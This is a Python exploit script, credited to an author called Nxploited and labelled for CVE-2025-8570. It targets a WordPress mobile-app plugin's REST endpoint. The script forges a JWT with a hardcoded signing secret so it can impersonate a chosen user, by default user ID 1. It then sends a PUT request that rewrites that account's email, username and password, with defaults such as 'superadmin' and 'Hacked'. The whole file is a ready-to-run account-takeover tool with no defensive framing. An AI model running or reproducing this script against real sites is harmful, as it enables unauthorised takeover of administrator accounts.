#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# By Nxploited ( Khaled Alenazi )

import sys
import argparse
import jwt
import json
import requests
from urllib.parse import urljoin

def fix_url(url):
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def generate_jwt(url, user_id=1, secret="example_key"):
    payload = {
        "iss": url,
        "iat": 0,
        "nbf": 0,
        "exp": 1893456000,
        "data": {"user_id": user_id}
    }
    token = jwt.encode(payload, secret, algorithm="HS256")
    return token.decode() if isinstance(token, bytes) else token

def build_headers(token):
    return {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Nxploited/1.0"
    }

def build_api_url(url):
    return urljoin(url, "/wp-json/grind-mobile-app/v1/customers/1")

def build_payload(args):
    data = {
        "email": args.email,
        "first_name": args.first_name,
        "last_name": args.last_name,
        "username": args.username,
        "password": args.password
    }
    return {k: v for k, v in data.items() if v}

def extract_important_fields(resp, args):
    # Only show these fields, in this order
    keys = [
        "id", "email", "first_name", "last_name", "role", "username"
    ]
    out = {}
    for k in keys:
        if k == "id":
            out[k] = resp.get("id", args.id if hasattr(args, "id") else 1)
        else:
            out[k] = resp.get(k, getattr(args, k, ""))
    return out

def write_output(filename, content):
    with open(filename, "w") as f:
        f.write(content)

def exploit(args):
    base_url = fix_url(args.url)
    api_url = build_api_url(base_url)
    token = args.token or generate_jwt(base_url, args.id)
    headers = build_headers(token)
    data = build_payload(args)
    try:
        response = requests.put(api_url, headers=headers, data=json.dumps(data), timeout=15)
    except Exception as e:
        print(f"[Nxploited] Request failed: {e}")
        sys.exit(1)

    # Simulate curl-like HTTP status and headers
    print(f"HTTP/1.1 {response.status_code} {'OK' if response.status_code == 200 else ''}")
    for k, v in response.headers.items():
        print(f"{k}: {v}")

    try:
        json_resp = response.json()
        important = extract_important_fields(json_resp, args)
        print(json.dumps(important, indent=2, ensure_ascii=False))
        if args.output:
            write_output(args.output, json.dumps(important, indent=2, ensure_ascii=False))
    except Exception as ex:
        print(f"[Nxploited] Invalid JSON: {ex}")
        print(response.text)

def parse_args():
    parser = argparse.ArgumentParser(
        prog="Nxploited-CVE-2025-8570",
        description="Exploit By: Khaled ALenazi (Nxploited)"
    )
    parser.add_argument(
        "-u", "--url", required=True,
        help="Target WordPress site URL (e.g. http://nxploit.ddev.site)"
    )
    parser.add_argument(
        "-id", "--id", type=int, default=1,
        help="User ID to impersonate (default: 1)"
    )
    parser.add_argument(
        "-em", "--email", default="nxploitadmin@example.com",
        help="Email address (default: nxploitadmin@example.com)"
    )
    parser.add_argument(
        "-fn", "--first_name", default="Hacked",
        help="First name (default: Nxploited)"
    )
    parser.add_argument(
        "-ln", "--last_name", default="Nxploited",
        help="Last name (default: Nxploited)"
    )
    parser.add_argument(
        "-un", "--username", default="superadmin",
        help="Username (default: superadmin)"
    )
    parser.add_argument(
        "-pw", "--password", default="",
        help="Password (optional)"
    )
    parser.add_argument(
        "-tk", "--token", default=None,
        help="Custom JWT token (optional, will generate one if not given)"
    )
    parser.add_argument(
        "-o", "--output", default=None,
        help="Write result to file (optional)"
    )
    return parser.parse_args()

def main():
    print("\nExploit By: Khaled ALenazi (Nxploited)\n")
    args = parse_args()
    exploit(args)

if __name__ == "__main__":
    main()
